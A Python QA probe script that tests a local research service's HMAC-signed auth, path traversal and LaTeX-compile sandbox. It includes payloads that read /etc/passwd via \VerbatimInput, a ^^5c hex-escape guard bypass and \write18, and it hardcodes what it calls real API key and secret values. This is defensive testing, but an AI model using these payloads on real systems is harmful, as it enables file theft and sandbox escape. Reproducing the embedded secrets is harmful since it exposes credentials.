"""QA(Edward) 黑盒 HTTP 探针：对运行中的 8300 打带签名/篡改签名的请求。

覆盖 B(凭据泄漏) / C(鉴权越权) / E(双前缀) / A(黑盒逃逸复现)。
运行：PYTHONPATH=. .venv/Scripts/python.exe tests/real_sandbox/probe_http_edward.py
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import pathlib
import urllib.error
import urllib.request

SERVICE_ENV = pathlib.Path(r"D:\math-arena\services\research-vnext\.env")
LOG = pathlib.Path(r"D:\math-arena\logs\xf-8300.log")
PREFIXES = {
    "vnext": "http://127.0.0.1:8300/api/research-vnext",
    "v1": "http://127.0.0.1:8300/api/research-v1",
}

# 真实敏感值（仅用于**断言不外泄**；不写入任何受版本控制的文件）
REAL_API_KEY = "31a1cee598de3c03a5c8153f1c9b9c00"
REAL_API_SECRET = "MjcwY2ZhZjgwMWJjZDkwZTBkZjA0YjE0"

LATEX_OK = (
    "\\documentclass{article}\n\\begin{document}\n\\section{Intro}\nHello.\n\\end{document}"
)
# guard 未拦：把 /etc/passwd 读进 PDF
LATEX_EXFIL = (
    "\\documentclass{article}\n\\usepackage{fancyvrb}\n\\begin{document}\n"
    "\\VerbatimInput{/etc/passwd}\n\\end{document}\n"
)
# ^^5c 转义绕过：guard 放行，容器内执行 \input
LATEX_HEXBYPASS = (
    "\\documentclass{article}\n\\begin{document}\n"
    "X^^5cinput{/nonexistent_probe_zzz}Y\n\\end{document}\n"
)


def load_env() -> dict[str, str]:
    env = {}
    for line in SERVICE_ENV.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, _, v = line.partition("=")
            env[k.strip()] = v.strip()
    return env


def b64_ctx(ctx: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(ctx, separators=(",", ":")).encode()
    ).decode().rstrip("=")


def make_ctx(**over) -> dict:
    ctx = {
        "actor_id": "d1f1756e-6e5a-4a3f-9b0e-52f0a1b2c3d4",
        "tenant_id": "a1a2a3a4-b1b2-4c1c-8d1d-000000000001",
        "project_id": "b2b3b4b5-c2c2-4d2d-9e2e-000000000002",
        "session_id": "00000000-0000-4000-8000-0000000000ff",
        "workspace": "research",
        "domain": "research-vnext",
        "capabilities": ["workspace.research.enter", "research.session.write"],
        "resource_scopes": [
            {"kind": "project", "id": "b2b3b4b5-c2c2-4d2d-9e2e-000000000002", "role": "owner"}
        ],
        "security_version": 1,
        "policy_version": "p1",
        "trace_id": "0" * 32,
        "authority": "api",
    }
    ctx.update(over)
    return ctx


def sign(payload: str, secret: str) -> str:
    return hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()


def req(method: str, url: str, headers: dict, body: dict | None = None):
    data = json.dumps(body, ensure_ascii=False).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=180) as resp:
            return resp.status, resp.headers.get("content-type", ""), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers.get("content-type", ""), e.read()
    except Exception as e:  # noqa: BLE001
        return -1, "", f"{type(e).__name__}: {e}".encode()


def brief(raw: bytes, ctype: str, limit: int = 240) -> str:
    if "pdf" in ctype:
        return f"<pdf {len(raw)}B>"
    return raw.decode("utf-8", "replace")[:limit]


def pdf_text(raw: bytes) -> str:
    """抽取返回 PDF 的文本层（判断容器文件是否被明文带回）。"""
    import tempfile
    from pathlib import Path

    import pypdfium2 as pdfium

    p = Path(tempfile.mkdtemp()) / "resp.pdf"
    p.write_bytes(raw)
    with pdfium.PdfDocument(str(p)) as doc:
        return "".join(pg.get_textpage().get_text_range() for pg in doc)


def main() -> None:
    secret = load_env()["RESEARCH_GATEWAY_HMAC_SECRET"]
    base = PREFIXES["vnext"]
    ctx = make_ctx()
    payload = b64_ctx(ctx)
    good = sign(payload, secret)

    def H(p=payload, s=good):
        return {"X-Research-Access-Context": p, "X-Research-Access-Sig": s,
                "Content-Type": "application/json"}

    results: list[tuple[str, int, bytes, str]] = []

    def run(label, method, path, headers, body=None, base_url=base):
        st, ct, raw = req(method, base_url + path, headers, body)
        results.append((label, st, raw, ct))
        print(f"[{label:52s}] HTTP {st:>3} {ct.split(';')[0]:24s} {brief(raw, ct)}")
        return st, raw, ct

    print("========== C · 鉴权 ==========")
    run("health 无签名", "GET", "/xf/health", {"Content-Type": "application/json"})
    run("health 篡改签名", "GET", "/xf/health", H(s="0" * 64))
    run("health 篡改 payload（签名不匹配）", "GET", "/xf/health", H(p=b64_ctx(make_ctx(actor_id="00000000-0000-4000-8000-000000000001"))))

    def Hs(ctx: dict):
        p = b64_ctx(ctx)
        return H(p=p, s=sign(p, secret))

    run("健康 ctx 但缺字段（合法签名）", "GET", "/xf/health", Hs({"workspace": "research"}))
    run("健康 ctx 非法 UUID（合法签名）", "GET", "/xf/health", Hs(make_ctx(actor_id="not-a-uuid")))
    # 额度纪律：会真正调上游的用例默认跳过，需 QA_ALLOW_QUOTA=1 才跑
    if os.getenv("QA_ALLOW_QUOTA") == "1":
        run("run 空能力（合法签名）", "POST", "/xf/workflows/writing_polish/run",
            Hs(make_ctx(capabilities=[])), {"parameters": {"AGENT_USER_INPUT": "x"}})
        run("run 越权 workspace（合法签名）", "POST", "/xf/workflows/writing_polish/run",
            Hs(make_ctx(workspace="classroom")), {"parameters": {"AGENT_USER_INPUT": "x"}})
    else:
        print("  [跳过] run 空能力 / 越权 workspace（额度纪律，设 QA_ALLOW_QUOTA=1 才跑）")
    run("health 有效签名", "GET", "/xf/health", H())
    run("workflows 有效签名", "GET", "/xf/workflows", H())

    print("========== C · 工作流越权/路径 ==========")
    run("unknown workflow", "POST", "/xf/workflows/does_not_exist/run", H(), {"parameters": {}})
    run("workflow=.. 单段", "POST", "/xf/workflows/../run", H(), {"parameters": {}})
    # 原始 URL（不预编码）：绕开 route 单段限制的尝试
    for desc, path in (
        ("%2e%2e%2fwriting_polish", "/xf/workflows/%2e%2e%2fwriting_polish/run"),
        ("超长300", "/xf/workflows/" + "A" * 300 + "/run"),
        ("%00 截断", "/xf/workflows/writing_polish%00/run"),
    ):
        st, ct, raw = req("POST", base + path, H(), {"parameters": {}})
        print(f"[workflow={desc:32s}] HTTP {st:>3} {brief(raw, ct)}")

    print("========== A · 黑盒逃逸复现（latex:compile）==========")
    run("latex 正常编译", "POST", "/xf/latex:compile", H(), {"source": LATEX_OK})
    run("latex guard 拦截 \\write18", "POST", "/xf/latex:compile", H(),
        {"source": "\\documentclass{article}\\begin{document}\\write18{id}\\end{document}"})
    st, raw, ct = run("latex 逃逸读 /etc/passwd（VerbatimInput）", "POST", "/xf/latex:compile", H(),
                      {"source": LATEX_EXFIL})
    if "pdf" in ct and raw[:4] == b"%PDF":
        txt = pdf_text(raw)
        print(f"    >>> 返回 PDF 文本层是否含 /etc/passwd 内容: {'root:x:0:0' in txt}")
        print(f"    >>> 文本层前 160 字: {txt[:160]!r}")
    run("latex ^^5c 绕过 guard（进容器）", "POST", "/xf/latex:compile", H(),
        {"source": LATEX_HEXBYPASS})

    print("========== E · 双前缀 ==========")
    run("v1 前缀 health", "GET", "/xf/health", H(), base_url=PREFIXES["v1"])
    run("v1 前缀 workflows", "GET", "/xf/workflows", H(), base_url=PREFIXES["v1"])

    print("========== B · 响应/日志凭据扫描 ==========")
    leaks = []
    for label, st, raw, ct in results:
        blob = raw if isinstance(raw, bytes) else b""
        if REAL_API_KEY.encode() in blob:
            leaks.append(f"RESP {label}: api_key")
        if REAL_API_SECRET.encode() in blob:
            leaks.append(f"RESP {label}: api_secret")
    logtext = LOG.read_text(encoding="utf-8", errors="replace") if LOG.exists() else ""
    if REAL_API_KEY in logtext:
        leaks.append("LOG: api_key")
    if REAL_API_SECRET in logtext:
        leaks.append("LOG: api_secret")
    print("  泄漏项:", leaks or "无（key/secret 未出现在任何响应体与日志中）")


if __name__ == "__main__":
    main()
